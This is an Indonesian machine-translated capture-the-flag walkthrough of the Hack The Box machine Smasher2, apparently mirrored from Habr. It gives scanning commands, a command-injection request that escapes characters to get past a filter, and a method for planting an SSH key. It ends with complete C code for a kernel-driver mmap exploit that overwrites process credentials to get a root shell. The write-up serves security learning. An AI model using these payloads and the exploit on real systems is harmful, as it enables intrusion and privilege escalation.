<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ—ï¸ ğŸ¦— ğŸ™‹ğŸ¾ Hack The Box - Smasher2 Walkthrough Labu, WAF, dan LPE melalui driver pwn âš›ï¸ ğŸ˜— ğŸŒˆ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Pada artikel ini, saya akan mulai menerbitkan solusi yang dikirim untuk diproses lebih lanjut dari situs HackTheBox . Saya harap ini akan membantu set...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Hack The Box - Smasher2 Walkthrough Labu, WAF, dan LPE melalui driver pwn</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/480454/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/ms/yw/0j/msyw0jxgua25iuntaxj1qcayfuq.png" alt="gambar"></div><br>  Pada artikel ini, saya akan mulai menerbitkan solusi yang dikirim untuk <a href="https://www.hackthebox.eu/" rel="nofollow">diproses lebih lanjut</a> dari situs <a href="https://www.hackthebox.eu/" rel="nofollow">HackTheBox</a> .  Saya harap ini akan membantu setidaknya seseorang untuk berkembang di bidang keamanan informasi.  Pada artikel ini kita akan membalikkan perpustakaan untuk python, memotong WAF dan mengeksploitasi kerentanan mmap. <br><br>  Koneksi ke laboratorium adalah melalui VPN.  Disarankan untuk tidak terhubung dari komputer kerja atau dari host di mana data yang penting bagi Anda tersedia, karena Anda berakhir di jaringan pribadi dengan orang-orang yang mengetahui sesuatu di bidang keamanan informasi :) <br><br><div class="spoiler">  <b class="spoiler_title">Informasi Organisasi</b> <div class="spoiler_text">  Terutama bagi mereka yang ingin mempelajari sesuatu yang baru dan berkembang di bidang informasi dan keamanan komputer, saya akan menulis dan berbicara tentang kategori berikut: <br><br><ul><li>  PWN; </li><li>  kriptografi (Crypto); </li><li>  teknologi jaringan (Jaringan); </li><li>  membalikkan (Reverse Engineering); </li><li>  steganografi (Stegano); </li><li>  pencarian dan eksploitasi kerentanan WEB. </li></ul><br>  Selain itu, saya akan membagikan pengalaman saya dalam forensik komputer, analisis malware dan firmware, serangan pada jaringan nirkabel dan jaringan area lokal, melakukan pentest dan menulis eksploitasi. <br><a name="habracut"></a><br>  Agar Anda dapat mengetahui tentang artikel baru, perangkat lunak, dan informasi lainnya, saya membuat <a href="https://t.me/RalfHackerChannel" rel="nofollow">saluran di Telegram</a> dan <a href="https://t.me/RalfHackerPublicChat" rel="nofollow">grup untuk membahas masalah apa pun</a> di bidang ICD.  Juga, saya pribadi akan mempertimbangkan permintaan pribadi Anda, pertanyaan, saran dan rekomendasi <a href="https://t.me/hackerralf8" rel="nofollow">secara pribadi dan akan menjawab semua orang</a> . <br><br>  Semua informasi disediakan hanya untuk tujuan pendidikan.  Penulis dokumen ini tidak bertanggung jawab atas kerusakan yang disebabkan seseorang sebagai akibat dari menggunakan pengetahuan dan metode yang diperoleh sebagai hasil dari mempelajari dokumen ini. <br></div></div><br><h2>  Kecerdasan </h2><br><h3>  Pemindaian port </h3><br>  Mesin ini memiliki alamat IP 10.10.10.135, yang saya tambahkan ke / etc / hosts. <br> <code>10.10.10.135 smasher2.htb</code> <br>  Pertama, kami memindai port terbuka.  Karena butuh waktu lama untuk memindai semua port dengan nmap, saya akan melakukan ini dengan masscan.  Kami memindai semua port TCP dan UDP dari antarmuka tun0 dengan kecepatan 1000 paket per detik. <br><br><pre> <code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.135 --rate=1000</code> </pre> <br><img src="https://habrastorage.org/webt/ua/l0/kl/ual0klllexxrrkhyehygavfrji8.png" alt="gambar"><br><br>  Tuan rumah memiliki 3 port terbuka.  Sekarang pindai dengan nmap untuk mendapatkan detail lebih lanjut. <br><br><pre> <code class="bash hljs">nmap -A 10.10.10.135 -p22,53,80</code> </pre> <br><img src="https://habrastorage.org/webt/rv/21/y3/rv21y3ntl_dol3qnlgvdhvshdhg.png" alt="gambar"><br><br>  Jadi kita memiliki SSH, DNS dan WEB, yang mengembalikan kode 403 (Dilarang, akses ditolak). <br><br><h3>  DNS </h3><br>  Mari kita periksa DNSnya.  Untuk melakukan ini, gunakan klien host, dengan opsi -l, untuk menggunakan permintaan AXFR untuk melihat daftar semua host di domain. <br><br><pre> <code class="bash hljs">host -l smasher2.htb 10.10.10.135</code> </pre> <br><img src="https://habrastorage.org/webt/3q/st/te/3qstteuzgycf6fxuc_7vxit1rfe.png" alt="gambar"><br><br>  Karena itu, Anda perlu menambahkan entri baru di / etc / hosts. <br> <code>10.10.10.135 wonderfulsessionmanager.smasher2.htb</code> <br> <br><h3>  WEB </h3><br>  Sekarang mari kita beralih untuk melihat apa yang akan diberikan WEB saat mengakses smasher2.htb. <br><br><img src="https://habrastorage.org/webt/9-/li/n5/9-lin58jouqm966oevnsoccso1a.png" alt="gambar"><br><br>  Itu kosong.  Dalam hal ini, Anda harus memilah direktori.  Saya menggunakan golang gobuster cepat ditulis.  Kami akan memilah direktori dalam 128 utas, kami akan tertarik pada html, php, txt, ekstensi conf, dan kode respons 200, 204, 301, 302, 307, 401. <br><br><pre> <code class="bash hljs">gobuster dir -t 128 -u http://smasher2.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,conf -s 200,204,301,302,307,401</code> </pre><br><img src="https://habrastorage.org/webt/iw/du/g9/iwdug9gy9ukr37s9nn4-c7pqojk.png" alt="gambar"><br><br>  Temukan direktori cadangan.  Kami melihat apa yang ada di dalamnya. <br><br><img src="https://habrastorage.org/webt/id/lj/zz/idljzzfub_qbnzzwu2x1lic2l38.png" alt="gambar"><br><br>  Hasilnya, unduh file python dan pustaka.  Selanjutnya, pergi ke nama domain lain, dan di sana kami menemukan formulir otorisasi. <br><br><img src="https://habrastorage.org/webt/mu/n0/mp/mun0mpgaqduxfzmhxifnqbq6_gg.png" alt="gambar"><br><br>  Plugin Mozilla Firefox Wappalyzer melaporkan teknologi mana yang sedang digunakan.  Dengan demikian, situs ini ditulis dalam python 2.7.15. <br><br><img src="https://habrastorage.org/webt/ze/h9/ze/zeh9zeby2o839yeim2osz0-w__i.png" alt="gambar"><br><br><h2>  API WEB </h2><br><h3>  Python </h3><br>  Kami baru saja menemukan file auth.py, mari kita parsing.  Di baris pertama impor, kita beralih ke modul ses.so, yang juga kita temukan di cadangan. <br><br><img src="https://habrastorage.org/webt/8-/ap/rm/8-aprmznzxtkkd04fzy9wzzrchk.png" alt="gambar"><br><br>  Kami menemukan otentikasi dalam kode.  Jika otentikasi berhasil, kami akan dikembalikan secret_token_info. <br><br><img src="https://habrastorage.org/webt/vn/er/sa/vnersai2zkkcopwujarn-9abz8i.png" alt="gambar"><br><br><img src="https://habrastorage.org/webt/j2/yp/3e/j2yp3emp8fwuj4xbshedsf7bou0.png" alt="gambar"><br><br>  Mari kita pergi ke titik "/ api // pekerjaan".  Data diterima dengan metode POST, sedangkan mereka harus dalam format JSON.  Jika parameter jadwal ada dalam data, ia dilewatkan ke eksekusi sebagai perintah pada baris perintah. <br><br><img src="https://habrastorage.org/webt/x7/oh/fs/x7ohfsjrcxhr8-tuwqdtcsnjxq8.png" alt="gambar"><br><br>  Login dan kata sandi telah diedit ... Mereka ditransfer ke perpustakaan kami, yang membuat sesi - objek SessionManager. <br><br><img src="https://habrastorage.org/webt/uq/p4/2e/uqp42eqln2alvsfnpwyvjbe5c_q.png" alt="gambar"><br><br>  Fungsi safe_init_manager (id) akan dipanggil pada setiap panggilan baru, karena before_request.  Dengan demikian, sesi baru diinisialisasi. <br><br><img src="https://habrastorage.org/webt/95/wv/yu/95wvyudl1crmjq5nv-bq-li7gze.png" alt="gambar"><br><br>  Fungsi login () membuat objek manajer yang bergantung pada sesi. <br><br><img src="https://habrastorage.org/webt/zi/0t/uh/zi0tuhqdy8ewibq3purmsr6u5_e.png" alt="gambar"><br><br>  Dan pemeriksaan dilakukan dengan metode check_login (). <br><br><img src="https://habrastorage.org/webt/u8/xt/_v/u8xt_vgcczwhkl4cbqlzov7tsio.png" alt="gambar"><br><br><h3>  Balikkan .so </h3><br>  Jadi kita perlu mencari tahu bagaimana data diperiksa.  Untuk melakukan ini, di perpustakaan kita perlu memahami perangkat SessionManager.check_login ().  Lemparkan ke IDA Pro, cari fungsi yang diinginkan. <br><br><img src="https://habrastorage.org/webt/ui/--/y0/ui--y0og5qsjhymyhpozz6kux0u.png" alt="gambar"><br><br>  Membuka fungsinya, saya memperhatikan grafiknya.  Saya tertarik pada sejumlah blok yang lebih rendah, sebelum melakukan konvergensi. <br><br><img src="https://habrastorage.org/webt/89/1o/7r/891o7r5jjpip6zh2uqba7xzbgrs.png" alt="gambar"><br><br>  Melihat melalui blok, Anda dapat melihat apa yang dibicarakan oleh cabang fungsi ini atau itu.  Jadi, kita hanya perlu blok paling kanan. <br><br><img src="https://habrastorage.org/webt/ve/xq/da/vexqdaz61fubdsfteffkqdx0ngi.png" alt="gambar"><br><br>  Saya melukis garis perilaku fungsi yang menarik minat kami. <br><br><img src="https://habrastorage.org/webt/9c/k9/ao/9ck9aomluu0wemswvub1salylas.png" alt="gambar"><br><br>  Sekarang mari kita pergi dan melihat apa yang terjadi.  Di satu tempat, saya melihat kode identik untuk login dan kata sandi.  Dan juga perbandingan yang sama. <br><br><img src="https://habrastorage.org/webt/65/fs/cd/65fscdprft3krxphyiwtbxdq_vg.png" alt="gambar"><br><br>  Selain itu, fungsi yang sama dipanggil untuk login dan kata sandi. <br><br><img src="https://habrastorage.org/webt/jo/um/w3/joumw3woscffqrof2lnjlyajdqs.png" alt="gambar"><br><br>  Ini menunjukkan bahwa nama pengguna dan kata sandi sama.  Tetapi karena nilai ini datang ke program python dan telah diedit, tetap hanya untuk memilah-milah.  Saya mencoba nama standar dan, yang mengejutkan saya, Administrator datang (mengapa saya tidak segera mencoba ...). <br><br><img src="https://habrastorage.org/webt/xp/9n/at/xp9natep2ikm8wlduicpijksqug.png" alt="gambar"><br><br><h2>  Titik masuk </h2><br>  Kami punya kunci.  Sekarang Anda perlu mengumpulkan permintaan untuk mengeksekusi kode.  Seperti disebutkan sebelumnya, kita harus mengirim data metode POST yang berisi parameter jadwal dalam format JSON ke <a href="http://wonderfulsessionmanager.smasher2.htb/auth/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job" rel="nofollow">wonderfulsessionmanager.smasher2.htb / auth / fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8 / pekerjaan</a> .  Kami melakukan ini dengan ikal, dan meneruskan hasilnya ke jq.  Kami akan menjalankan perintah whoami. <br><br><pre> <code class="bash hljs">curl -s -H <span class="hljs-string"><span class="hljs-string">"Cookie: session=eyJpZCI6eyIgYiI6Ik5UaGlZVEJrTmpBMk1qYzBNemN4TmprellUTm1NREV3TXprMk9USTRPV1UzTnpVd05EQXdZZz09In19.XfZcLA.R3UTUnieAARkHBTbqpTmofKWtBw"</span></span> -H <span class="hljs-string"><span class="hljs-string">"Content-Type: application/json"</span></span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="hljs-string"><span class="hljs-string">'{"schedule":"whoami"}'</span></span> | jq</code> </pre> <br><img src="https://habrastorage.org/webt/-s/u0/er/-su0erve1bo3frizq-_qmtlyclq.png" alt="gambar"><br><br>  Tetapi ketika mencoba mengeksekusi perintah "ls", kami mendapatkan kesalahan. <br><br><img src="https://habrastorage.org/webt/sz/c7/pk/szc7pkucef1xd5errhnrw01ydas.png" alt="gambar"><br><br>  Kemungkinan besar ada filter di tim.  Mari kita kirim "l \\ s" - berhasil, yang menunjukkan adanya filter. <br><br><img src="https://habrastorage.org/webt/bx/vl/wy/bxvlwyxbspsgt_bsucpjk8gkdda.png" alt="gambar"><br><br><h2>  PENGGUNA </h2><br>  Sekarang kita perlu mendapatkan shell normal di sistem.  Sistem menjalankan SSH, sehingga kami dapat membuat kunci dan mendorongnya ke daftar host yang diotorisasi. <br><br>  Pertama kita menghasilkan kunci. <br><br><img src="https://habrastorage.org/webt/75/nx/-m/75nx-mr9ckmrkoyiwer3tte6qbm.png" alt="gambar"><br><br>  Sekarang kita perlu mentransfer kunci publik kita ke file /home/dzonerzy/.ssh/authorized_keys.  Tetapi untuk membuatnya mudah untuk ditransfer, kami akan menggunakan pengodeannya di base64. <br><br><pre> <code class="bash hljs">base64 -w0 id_rsa.pub</code> </pre> <br>  Kami mentransfernya terlebih dahulu ke file sementara. <br><br><pre> <code class="bash hljs">ec\\ho \â€=\â€ &gt; /tmp/ralf</code> </pre> <br>  Sekarang decode dan tulis sebagaimana dimaksud. <br><pre> <code class="bash hljs">ba\\se\\64 -\\d /tmp/ralf &gt;&gt; /home/dzonerzy/\\.\\ss\\h/auth\\orized_ke\\ys</code> </pre> <br>  Kami mencatat kuncinya, sekarang jika semuanya baik-baik saja, kami dapat terhubung melalui SSH menggunakan kunci pribadi.  Kami mencoba.  Dan kita berada dalam sistem. <br><br><img src="https://habrastorage.org/webt/mf/7t/7n/mf7t7nnau3dbshpiirvblygdrhk.png" alt="gambar"><br><br><h2>  LPE - ROOT </h2><br><h3>  Daftar </h3><br>  Di sebelah token pengguna terdapat file README.  Baca itu. <br><br><img src="https://habrastorage.org/webt/n0/io/bi/n0iobindnitc1h69lhemnrnskmw.png" alt="gambar"><br><br>  Kita diberi tahu bahwa kita tidak boleh berpikir dengan cara standar ... Tapi setelah menyelesaikan enumerasi standar dan tidak menemukan apa pun, saya menarik perhatian ke grup tempat pengguna itu berada. <br><br><img src="https://habrastorage.org/webt/ko/rc/9u/korc9u_5ji78nds_jgcnelql_uq.png" alt="gambar"><br><br>  Grup adm memiliki akses ke file yang menarik. <br><br><img src="https://habrastorage.org/webt/dp/oj/c0/dpojc0lhn1tpdzsgcp0k11vtyec.png" alt="gambar"><br><br>  Misalnya, auth.log.  Ini tidak hanya mencerminkan fakta-fakta otorisasi yang berhasil dan tidak berhasil, tetapi juga fakta-fakta menggunakan perintah sudo. <br><br><pre> <code class="bash hljs">strings /var/<span class="hljs-built_in"><span class="hljs-built_in">log</span></span>/auth.log | grep sudo</code> </pre> <br><img src="https://habrastorage.org/webt/8t/a6/r7/8ta6r7a-rgji8-ruimkshuc-2to.png" alt="gambar"><br><br>  Perintah yang menarik dijalankan atas nama root.  Tapi itu terhubung dengan driver, jadi Anda perlu memastikan bahwa kami mengikuti jalan. <br><br><img src="https://habrastorage.org/webt/ix/1i/gx/ix1igxiggwoaugz01xkwu81ftbe.png" alt="gambar"><br><br>  Ya, sayangnya, semuanya berjalan ke pengemudi. <br><br><h3>  Supir </h3><br>  Karena ini adalah driver (modul kernel), kami akan mendapatkan informasi tentang hal itu menggunakan modinfo. <br><br><img src="https://habrastorage.org/webt/ek/bh/1v/ekbh1vr8tpqrjysaqtkuu3ogwsk.png" alt="gambar"><br><br>  Dikatakan bahwa pengemudi diperlukan untuk bekerja dengan perangkat dhid.  Lihat itu. <br><br><img src="https://habrastorage.org/webt/ck/bv/zx/ckbvzxss6iz1ughsn_lhqflutw4.png" alt="gambar"><br><br>  Ya  Ada perangkat seperti itu.  Untuk mempelajari driver, saya menyalinnya sendiri dan mengunduhnya ke IDA Pro. <br><br><pre> <code class="bash hljs">scp -i id_rsa dzonerzy@10.10.10.135:/lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko ./</code> </pre> <br>  Daftar fungsi yang sedikit, untuk PWN kami tertarik pada yang berfungsi dengan memori.  Dilihat dari namanya, ini adalah dev_read dan dev_mmap. <br><br><img src="https://habrastorage.org/webt/g9/k9/5s/g9k95slhxhlihqi0nhwm3ei5qxk.png" alt="gambar"><br><br>  Googling lebih lanjut, saya tidak secara khusus menemukan informasi tentang kerentanan driver terkait dengan membaca, yang tidak dapat dikatakan tentang mmap!  Jadi saya pergi kepadanya. <br><br><img src="https://habrastorage.org/webt/3v/rk/7x/3vrk7xh2hcwclirw59wcdzihxxe.png" alt="gambar"><br><br>  Secara umum, mmap pada driver diperlukan untuk memetakan perangkat ke memori dan memilih halaman sesuai permintaan, karena pada awalnya perangkat tidak menggunakan memori fisik sama sekali. <br><br>  Dalam kode ini, satu-satunya tempat yang menarik adalah panggilan ke fungsi remap_pfn_range, yang memungkinkan pemetaan linear memori perangkat ke ruang alamat pengguna. <br><blockquote>  int remap_pfn_range (struct vm_area_struct * vma, virt_add panjang yang tidak ditandatangani, pfn panjang yang tidak ditandatangani, ukuran panjang yang tidak ditandatangani, pgprot_t prot); <br><br>  Menampilkan ukuran byte alamat fisik, dimulai dengan nomor halaman yang ditentukan oleh pfn untuk virtual address virt_add.  Bit keamanan yang terkait dengan ruang virtual ditentukan dalam prot. </blockquote><br>  Seperti biasa, kita melihat parameter yang sebelumnya tidak diproses.  Ini adalah parameter pfn dan ukuran, yang memungkinkan kami menampilkan sejumlah memori untuk membaca dan menulis. <br><br><h3>  Eksploitasi </h3><br>  Googling apa yang bisa dilakukan tentang itu, saya dikejutkan oleh cara eksploitasi yang mungkin.  Jika kita dapat menemukan struktur kontrol kredit dalam memori, ini akan memungkinkan kita untuk mengubah pengguna menjadi 0. Dan kemudian memanggil shell, yang akan memberi kita shell dengan hak istimewa penuh. <br><br><img src="https://habrastorage.org/webt/of/os/r5/ofosr5umezutxzuvasy8xd-_cqg.png" alt="gambar"><br><br>  Pertama, periksa apakah kami dapat menampilkan sejumlah besar memori.  Kode berikut akan membuka perangkat dan menampilkan 0xf0000000 byte mulai dari alamat 0x40404040 untuk membaca dan menulis dengan kemungkinan menggunakan refleksi ini dengan proses lain yang mencerminkan objek yang sama. <br><br><div class="spoiler">  <b class="spoiler_title">kode</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br>  Kompilasi: <code>gcc sh.c -o sh.bin</code> dan transfer ke host.  Mari kita jalankan. <br><br><img src="https://habrastorage.org/webt/vh/d2/u3/vhd2u3vjza59bcxi69drrpwoc9a.png" alt="gambar"><br><br>  Sekarang mari kita pergi ke terminal ssh lain dan melihat kartu memori dari proses ini. <br><br><img src="https://habrastorage.org/webt/6u/mp/v4/6umpv4dzghjv0y1u2lyyy6lad7g.png" alt="gambar"><br><br>  Seperti yang Anda lihat, alamatnya sama, label untuk membaca dan menulis, serta berbagi ditempelkan.  Itu ide yang bagus.  Langkah selanjutnya adalah menemukan struktur kredit dari proses dalam pikiran.  Dapat dilihat dari struktur di atas bahwa ciri khasnya akan menjadi 8 angka yang terluka oleh uid kita, berurutan. <br><br><div class="spoiler">  <b class="spoiler_title">kode</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, cred_iter: %d\n", addr, cred_iter); } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br>  Jadi kami menemukan 19 struktur serupa. <br><br><img src="https://habrastorage.org/webt/rj/j5/pl/rjj5plsfirobcfwqzc8vss-svtc.png" alt="gambar"><br><br>  Sekarang kita perlu menulis ulang semua uid menjadi 0. Setelah kita menulis ulang uid tentang struktur tertentu, kita akan memeriksa uid kita.  Segera setelah uid kita menjadi sama dengan 0, kita dapat mengasumsikan bahwa kita telah menemukan kredit dari proses yang kita butuhkan. <br><br><div class="spoiler">  <b class="spoiler_title">kode</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; if (getuid() == 0){ printf("found current struct... ptr: %p, crednum: %d\n", addr, cred_iter); break; } else{ cred_cur = 0; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; } } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br><img src="https://habrastorage.org/webt/1x/62/eq/1x62eqetpojbwrrimgaguepynb4.png" alt="gambar"><br><br>  Sekarang, setelah menemukan struktur yang kita butuhkan, kita akan mengubah uid ke 0xffffffff dan memanggil bash shell melalui fungsi exec. <br><br><div class="spoiler">  <b class="spoiler_title">kode</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; if (getuid() == 0){ printf("found current struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur += 1; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; execl("/bin/sh","-", (char *)NULL); break; } else{ cred_cur = 0; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; } } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br><img src="https://habrastorage.org/webt/mn/zl/xq/mnzlxqz8pj4qafv_w0jznrhb0_e.png" alt="gambar"><br><br>  Kami punya root.  Bahkan, ini adalah mesin yang sangat kompleks yang membutuhkan kecanggihan untuk menangani versi LPE ini. <br><br>  Tentu saja, sangat sulit untuk mengeksploitasi kerentanan pada pengemudi, dan saya berterima kasih kepada komunitas yang membantu saya dengan petunjuk tentang bagaimana untuk sampai ke pengemudi dan berbagi artikel tentang eksploitasi kerentanan yang serupa dalam mmap. <br><br>  Haruskah saya terus mempublikasikan analisis mesin yang dikirim untuk diproses lebih lanjut?  Anda dapat bergabung dengan kami di <a href="https://t.me/RalfHackerChannel" rel="nofollow">Telegram</a> .  Mari kita mengumpulkan komunitas di mana akan ada orang-orang yang berpengalaman dalam banyak bidang TI, maka kita selalu dapat saling membantu dalam masalah TI dan keamanan informasi. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id480454/">https://habr.com/ru/post/id480454/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id480432/index.html">Masalah penampil pertama, atau sulitnya konversi aliran video WebRTC ke HLS</a></li>
<li><a href="../id480440/index.html">Acara digital di St. Petersburg dari 16 hingga 22 Desember</a></li>
<li><a href="../id480444/index.html">Detektif Habra: 24 jam dari kehidupan 24 publikasi</a></li>
<li><a href="../id480446/index.html">Menulis reverse proxy Grafana on Go</a></li>
<li><a href="../id480452/index.html">Pertemuan # 9 OWASP Moscow: Catatan Kinerja</a></li>
<li><a href="../id480460/index.html">Solusi mendasar dari sistem persamaan linear. Tampak samping</a></li>
